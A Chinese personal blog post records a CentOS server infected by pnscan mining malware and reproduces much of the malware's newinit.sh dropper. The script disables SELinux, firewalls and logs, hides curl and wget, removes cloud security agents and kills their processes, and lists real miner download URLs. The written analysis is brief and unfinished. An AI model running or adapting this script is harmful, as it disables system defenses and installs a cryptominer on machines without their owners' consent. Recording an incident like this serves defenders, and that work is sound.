# ---
title: 记一次被pnscan病毒攻击的记录
category: [跳坑记录]
date: 2021-03-25 10:55:14
tags: 
    - centos
---

### 背景
发现top命令非常卡,通过查看 top 
发  

### 参考
一次惨痛的教训：被pnscan病毒攻击的经过
https://blog.csdn.net/chenmozhe22/article/details/112578057

### 主要代码 newinit.sh

```
#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/zzhs
rtdir="/etc/zzhs"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/cd1
mv /usr/bin/cur /usr/bin/cd1
mv /usr/bin/cdl /usr/bin/cd1
mv /usr/bin/cdt /usr/bin/cd1
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/wd1
mv /usr/bin/wge /usr/bin/wd1
mv /usr/bin/wdl /usr/bin/wd1
mv /usr/bin/wdt /usr/bin/wd1
ulimit -n 65535
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
ufw disable
iptables -F
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
if ps aux | grep -i '[a]liyun'; then
  $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi

service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %

rm -rf /usr/local/aegis
rm -f /tmp/.null 2>/dev/null

miner_url="http://195.58.39.46/cleanfda/zzh"
miner_url_backup="http://py2web.store/cleanfda/zzh"
miner_size="6006304"
sh_url="http://195.58.39.46/cleanfda/newinit.sh"
sh_url_backup="http://py2web.store/cleanfda/newinit.sh"
config_url="http://195.58.39.46/cleanfda/config.json"
config_url_backup="http://py2web.store/cleanfda/config.json"
config_size="2758"
chattr_size="8000"

sleep 1
if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get install -y unhide
apt-get install -y gawk
fi
if [ -x "$(command -v yum)" ]; then
yum install -y epel-release
yum install -y unhide
yum install -y gawk
fi

sleep 1
dddir="/usr/sbin/unhide"
$dddir quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null

sleep 1
if [ -x "$(command -v chattr)" ]; then
chattr -i /usr/bin/ip6network
chattr -i /usr/bin/kswaped
chattr -i /usr/bin/irqbalanced
chattr -i /usr/bin/rctlcli
chattr -i /usr/bin/systemd-network
chattr -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
chattr +i /usr/bin/ip6network
chattr +i /usr/bin/kswaped
chattr +i /usr/bin/irqbalanced
chattr +i /usr/bin/rctlcli
chattr +i /usr/bin/systemd-network
chattr +i /usr/bin/pamdicks
fi
if [ -x "$(command -v t)" ]; then
/usr/bin/t -i /usr/bin/ip6network
/usr/bin/t -i /usr/bin/kswaped
/usr/bin/t -i /usr/bin/irqbalanced
/usr/bin/t -i /usr/bin/rctlcli
/usr/bin/t -i /usr/bin/systemd-network
/usr/bin/t -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
/usr/bin/t +i /usr/bin/ip6network
/usr/bin/t +i /usr/bin/kswaped
/usr/bin/t +i /usr/bin/irqbalanced

/usr/bin/t +i /usr/bin/rctlcli
/usr/bin/t +i /usr/bin/systemd-network
/usr/bin/t +i /usr/bin/pamdicks
fi

mv /usr/bin/t /usr/bin/chattr

sleep 1

kill_miner_proc()
{
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
```
    
### 分析主要的过程


开始逆向修复

尝试将SELinux工作模式 切换成 宽容模式
```
setenforce 0 2>dev/null
```
参考：
SELinux工作模式设置（getenforce、setenforce和sestatus命令）
http://c.biancheng.net/view/3921.html
